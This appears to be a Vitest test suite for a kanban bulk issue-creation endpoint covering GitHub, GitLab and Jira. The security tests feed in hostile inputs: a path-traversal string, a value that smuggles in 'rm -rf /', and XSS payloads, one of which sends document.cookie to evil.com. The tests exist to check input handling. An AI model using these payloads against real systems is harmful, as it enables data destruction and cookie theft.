import { describe, it, expect, beforeAll, afterAll, vi, beforeEach } from 'vitest';
import Fastify, { FastifyInstance } from 'fastify';
import { kanbanRoutes } from '../kanban';

const { mockGithubCreateIssue, mockGitlabCreateIssue, mockJiraCreateIssue } = vi.hoisted(() => ({
  mockGithubCreateIssue: vi.fn(),
  mockGitlabCreateIssue: vi.fn(),
  mockJiraCreateIssue: vi.fn(),
}));

vi.mock('../../integrations/github/github-client', () => ({
  githubClient: {
    listRepositories: vi.fn().mockResolvedValue([]),
    listIssues: vi.fn().mockResolvedValue([]),
    createIssue: mockGithubCreateIssue,
  },
}));

vi.mock('../../integrations/gitlab/gitlab-client', () => ({
  gitlabClient: {
    getProjects: vi.fn().mockResolvedValue([]),
    listIssues: vi.fn().mockResolvedValue([]),
    createIssue: mockGitlabCreateIssue,
  },
}));

vi.mock('../../integrations/jira/jira-client', () => ({
  jiraClient: {
    getProjects: vi.fn().mockResolvedValue([]),
    searchIssues: vi.fn().mockResolvedValue([]),
    createIssue: mockJiraCreateIssue,
  },
}));

vi.mock('../../work-items/database', () => ({
  workItemDatabase: {
    listWorkItems: vi.fn().mockReturnValue({ items: [], total: 0 }),
  },
}));

vi.mock('../../agent-runs/database', () => ({
  agentRunDatabase: {
    listRuns: vi.fn().mockReturnValue({ runs: [], total: 0 }),
  },
}));

describe('POST /cards/bulk', () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    app = Fastify();
    await app.register(kanbanRoutes, { prefix: '/api/kanban' });
    await app.ready();
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('should return 400 when items is missing', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: { platform: 'github', repo: 'owner/repo' },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error).toMatch(/items/);
  });

  it('should return 400 when items is empty', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: { items: [], platform: 'github', repo: 'owner/repo' },
    });
    expect(res.statusCode).toBe(400);
  });

  it('should return 400 for invalid platform', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Test task' }],
        platform: 'invalid',
        repo: 'owner/repo',
      },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error).toMatch(/Invalid platform/);
  });

  it('should return 400 when repo is missing', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Test task' }],
        platform: 'github',
      },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error).toMatch(/repo/i);
  });

  it('should return 400 when an item has an empty title', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: '' }],
        platform: 'github',
        repo: 'owner/repo',
      },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error).toMatch(/non-empty title/);
  });

  it('should return 400 when an item title exceeds 256 chars', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'x'.repeat(257) }],
        platform: 'github',
        repo: 'owner/repo',
      },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error).toMatch(/too long/i);
  });

  it('should return 400 for more than 50 items', async () => {
    const items = Array.from({ length: 51 }, (_, i) => ({ title: `Task ${i}` }));
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: { items, platform: 'github', repo: 'owner/repo' },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error).toMatch(/50/);
  });

  it('should create GitHub issues and return created items', async () => {
    mockGithubCreateIssue.mockResolvedValueOnce({
      number: 101,
      html_url: 'https://github.com/owner/repo/issues/101',
    });
    mockGithubCreateIssue.mockResolvedValueOnce({
      number: 102,
      html_url: 'https://github.com/owner/repo/issues/102',
    });

    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [
          { title: 'Implement auth module', body: 'Refactor the auth module' },
          { title: 'Write tests for auth' },
        ],
        platform: 'github',
        repo: 'owner/repo',
      },
    });

    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body.created).toHaveLength(2);
    expect(body.created[0]).toMatchObject({
      title: 'Implement auth module',
      id: '101',
      url: 'https://github.com/owner/repo/issues/101',
    });
    expect(body.created[1]).toMatchObject({
      title: 'Write tests for auth',
      id: '102',
      url: 'https://github.com/owner/repo/issues/102',
    });

    expect(mockGithubCreateIssue).toHaveBeenCalledTimes(2);
    expect(mockGithubCreateIssue).toHaveBeenCalledWith(
      expect.objectContaining({
        title: 'Implement auth module',
        body: 'Refactor the auth module',
        labels: ['enhancement', 'ready-for-agent'],
      }),
      'owner',
      'repo',
    );
  });

  it('should create GitLab issues', async () => {
    mockGitlabCreateIssue.mockResolvedValueOnce({
      iid: 55,
      id: 1001,
      web_url: 'https://gitlab.com/group/project/-/issues/55',
    });

    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Fix CI pipeline' }],
        platform: 'gitlab',
        repo: 'group/project',
      },
    });

    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body.created).toHaveLength(1);
    expect(body.created[0].id).toBe('55');
    expect(mockGitlabCreateIssue).toHaveBeenCalledWith(
      'group/project',
      expect.objectContaining({
        title: 'Fix CI pipeline',
        labels: 'enhancement,ready-for-agent',
      }),
    );
  });

  it('should create Jira issues', async () => {
    mockJiraCreateIssue.mockResolvedValueOnce({
      key: 'PROJ-42',
    });

    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Update documentation' }],
        platform: 'jira',
        repo: 'PROJ',
      },
    });

    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body.created).toHaveLength(1);
    expect(body.created[0].id).toBe('PROJ-42');
    expect(mockJiraCreateIssue).toHaveBeenCalledWith(
      expect.objectContaining({
        project: 'PROJ',
        summary: 'Update documentation',
        issueType: 'Task',
      }),
    );
  });

  it('should return errors for items that fail to create', async () => {
    mockGithubCreateIssue.mockRejectedValueOnce(new Error('API rate limit'));

    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Failing task' }],
        platform: 'github',
        repo: 'owner/repo',
      },
    });

    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body.created).toHaveLength(0);
    expect(body.errors).toHaveLength(1);
    expect(body.errors[0].title).toBe('Failing task');
    expect(body.errors[0].error).toBe('API rate limit');
  });

  it('should handle partial failures (some succeed, some fail)', async () => {
    mockGithubCreateIssue.mockResolvedValueOnce({
      number: 200,
      html_url: 'https://github.com/owner/repo/issues/200',
    });
    mockGithubCreateIssue.mockRejectedValueOnce(new Error('Server error'));

    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Good task' }, { title: 'Bad task' }],
        platform: 'github',
        repo: 'owner/repo',
      },
    });

    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body.created).toHaveLength(1);
    expect(body.errors).toHaveLength(1);
  });

  it('should trim whitespace from titles', async () => {
    mockGithubCreateIssue.mockResolvedValueOnce({
      number: 300,
      html_url: 'https://github.com/owner/repo/issues/300',
    });

    await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: '  Padded title  ' }],
        platform: 'github',
        repo: 'owner/repo',
      },
    });

    expect(mockGithubCreateIssue).toHaveBeenCalledWith(
      expect.objectContaining({ title: 'Padded title' }),
      'owner',
      'repo',
    );
  });

  it('should reject path-traversal repos', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Task' }],
        platform: 'github',
        repo: '../../../etc/passwd',
      },
    });
    expect(res.statusCode).toBe(400);
  });

  it('should reject repo with invalid characters', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Task' }],
        platform: 'github',
        repo: 'owner/repo;rm -rf /',
      },
    });
    expect(res.statusCode).toBe(400);
  });

  it('should pass item.body containing script tags through as-is to the API', async () => {
    mockGithubCreateIssue.mockResolvedValueOnce({
      number: 400,
      html_url: 'https://github.com/owner/repo/issues/400',
    });

    const maliciousBody = '<script>alert("xss")</script><img src=x onerror=alert(1)>';
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Task with malicious body', body: maliciousBody }],
        platform: 'github',
        repo: 'owner/repo',
      },
    });

    expect(res.statusCode).toBe(200);
    expect(mockGithubCreateIssue).toHaveBeenCalledWith(
      expect.objectContaining({ body: maliciousBody }),
      'owner',
      'repo',
    );
  });

  it('should pass item.body containing path-traversal strings through safely', async () => {
    mockGithubCreateIssue.mockResolvedValueOnce({
      number: 401,
      html_url: 'https://github.com/owner/repo/issues/401',
    });

    const traversalBody = '../../../etc/passwd\n../../secret';
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'Task with path traversal in body', body: traversalBody }],
        platform: 'github',
        repo: 'owner/repo',
      },
    });

    expect(res.statusCode).toBe(200);
    expect(mockGithubCreateIssue).toHaveBeenCalledWith(
      expect.objectContaining({ body: traversalBody }),
      'owner',
      'repo',
    );
  });

  it('should handle item.body with HTML event handlers without breaking', async () => {
    mockGitlabCreateIssue.mockResolvedValueOnce({
      iid: 60,
      id: 2001,
      web_url: 'https://gitlab.com/group/project/-/issues/60',
    });

    const xssBody = '"><svg/onload=fetch("https://evil.com?c="+document.cookie)>';
    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'XSS in body', body: xssBody }],
        platform: 'gitlab',
        repo: 'group/project',
      },
    });

    expect(res.statusCode).toBe(200);
    expect(mockGitlabCreateIssue).toHaveBeenCalledWith(
      'group/project',
      expect.objectContaining({ description: xssBody }),
    );
  });

  it('should default item.body to empty string when not provided', async () => {
    mockGithubCreateIssue.mockResolvedValueOnce({
      number: 402,
      html_url: 'https://github.com/owner/repo/issues/402',
    });

    const res = await app.inject({
      method: 'POST',
      url: '/api/kanban/cards/bulk',
      payload: {
        items: [{ title: 'No body field' }],
        platform: 'github',
        repo: 'owner/repo',
      },
    });

    expect(res.statusCode).toBe(200);
    expect(mockGithubCreateIssue).toHaveBeenCalledWith(
      expect.objectContaining({ body: '' }),
      'owner',
      'repo',
    );
  });
});
